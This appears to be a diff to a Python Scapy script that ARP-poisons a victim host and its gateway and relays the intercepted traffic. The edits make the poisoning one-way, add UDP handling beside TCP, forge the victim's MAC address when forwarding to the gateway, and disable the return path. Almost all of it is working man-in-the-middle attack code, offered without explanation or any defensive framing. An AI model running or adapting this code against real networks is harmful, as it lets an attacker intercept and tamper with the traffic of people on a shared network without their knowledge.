@@ -1,9 +1,9 @@
 #coding: utf-8
 import os
 import logging
+import binascii
 import re
 import sys
-import signal
 import threading
 import time
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)	# Delete scapy logging
@@ -22,9 +22,13 @@ class arp_poison(threading.Thread):
 	def run(self):
 		while(True):
 				# Malicious ARP packet send			
-			sendp(Ether(dst=self.victimMAC, src=self.myMAC)/ARP(op=ARP.is_at, psrc=self.gatewayIP, pdst=self.victimIP, hwsrc=self.myMAC, hwdst=self.victimMAC), count=3)	
-			sendp(Ether(dst=self.gatewayMAC, src=self.myMAC)/ARP(op=ARP.is_at, psrc=self.victimIP, pdst=self.gatewayIP, hwsrc=self.myMAC, hwdst=self.gatewayMAC), count=3)
-			time.sleep(2)
+			sendp(Ether(dst=self.victimMAC, src=self.myMAC)/ARP(op=ARP.is_at, psrc=self.gatewayIP, pdst=self.victimIP, hwsrc=self.myMAC, hwdst=self.victimMAC), count=3)
+#			sendp(Ether(dst=self.gatewayMAC, src=self.myMAC)/ARP(op=ARP.is_at, psrc=self.victimIP, pdst=self.gatewayIP, hwsrc=self.myMAC, hwdst=self.gatewayMAC), count=3)
+			time.sleep(3)
+
+
+
+
 
 class to_gateway(threading.Thread):
 	def __init__(self, _myMAC, _victimMAC, _myIP, _victimIP, _gatewayIP, _gatewayMAC):
@@ -37,19 +41,31 @@ class to_gateway(threading.Thread):
 		self.gatewayMAC = _gatewayMAC
 		self.ethlen = len(Ether())
 		self.iplen = len(IP())
-		self.tcplen = len(TCP())
-	
+		self.PROTOCOL_ICMP = 1
+		self.PROTOCOL_TCP = 6
+		self.PROTOCOL_UDP = 17
+
 	def run(self):
 		while(True):
-			sn = sniff(filter="ip and (ether src host " + self.victimMAC + ") and (ether dst host " + self.myMAC + ")", count=1)	
+			sn = sniff(filter="ip and (ether src host " + self.victimMAC + ") and (ether dst host " + self.myMAC + ")", count=1)
+			protocol = binascii.hexlify(str(sn[0]))[46:48]
 			e = sn[0]
 			t = str(e)
 			eth = Ether(t[:self.ethlen])
 			ip = IP(t[self.ethlen:])
-			tcp = TCP(t[self.ethlen+self.iplen:])
-	
-			pkt = Ether(dst=self.gatewayMAC, src=self.myMAC)/IP(src=self.victimIP, dst=ip.dst)/tcp
+			if int(protocol) == self.PROTOCOL_TCP:
+				tcp = TCP(t[self.ethlen+self.iplen:])
+#				pkt = Ether(dst=self.gatewayMAC, src=self.myMAC)/IP(src=self.victimIP, dst=ip.dst)/tcp
+				pkt = Ether(dst=self.gatewayMAC, src=self.victimMAC)/IP(src=ip.src, dst=ip.dst)/tcp
+			
+			elif int(protocol) == self.PROTOCOL_UDP:	
+				udp = UDP(t[self.ethlen+self.iplen:])
+#				pkt = Ether(dst=self.gatewayMAC, src=self.myMAC)/IP(src=self.victimIP, dst=ip.dst)/udp
+				pkt = Ether(dst=self.gatewayMAC, src=self.victimMAC)/IP(src=ip.src, dst=ip.dst)/udp
+			else: continue
 			sendp(pkt)
+
+
 
 class to_victim(threading.Thread):
 	def __init__(self, _myMAC, _victimMAC, _myIP, _victimIP, _gatewayIP, _gatewayMAC):
@@ -62,18 +78,27 @@ class to_victim(threading.Thread):
 		self.gatewayMAC = _gatewayMAC
 		self.ethlen = len(Ether())
 		self.iplen = len(IP())
-		self.tcplen = len(TCP())
+		self.PROTOCOL_ICMP = 1
+		self.PROTOCOL_TCP = 6
+		self.PROTOCOL_UDP = 17
 
 	def run(self):
 		while(True):
-			sn2 = sniff(filter="ip and (ether src host " + self.gatewayMAC + ") and (ether dst host " + self.myMAC + ") and (ip dst host " + self.victimIP + ")", count=1)		
+			sn2 = sniff(filter="(ether src host " + self.gatewayMAC + ") and (ether dst host " + self.myMAC + ") and (ip dst host " + self.victimIP + ")", count=1)
+			protocol =  binascii.hexlify(str(sn2[0]))[46:48]
 			e = sn2[0]
 			t = str(e)
 			eth = Ether(t[:self.ethlen])
 			ip = IP(t[self.ethlen:])
-			tcp = TCP(t[self.ethlen+self.iplen:])
-	
-			pkt = Ether(dst=self.victimMAC, src=self.myMAC)/IP(src=ip.src, dst=victimIP)/tcp
+			if int(protocol) == self.PROTOCOL_TCP:
+				tcp = TCP(t[self.ethlen+self.iplen:])
+				pkt = Ether(dst=self.victimMAC, src=self.myMAC)/IP(src=ip.src, dst=self.victimIP)/tcp
+			
+			elif int(protocol) == self.PROTOCOL_UDP:
+				udp = UDP(t[self.ethlen+self.iplen:])
+				pkt = Ether(dst=self.victimMAC, src=self.myMAC)/IP(src=ip.src, dst=self.victimIP)/udp
+
+			else: continue
 			sendp(pkt)
 
 def main():
@@ -117,15 +142,15 @@ def main():
 
 	tArp = arp_poison(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
 	tGateway = to_gateway(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
-	tVictim = to_victim(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
+#	tVictim = to_victim(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
 
 	tArp.start()
 	tGateway.start()
 #	tVictim.start()
 
 	tArp.join()
-	tGateway.join()	
-#	tVictim.start()
-	
+	tGateway.join()
+#	tVictim.join()
+
 if __name__ == '__main__':
 	main()
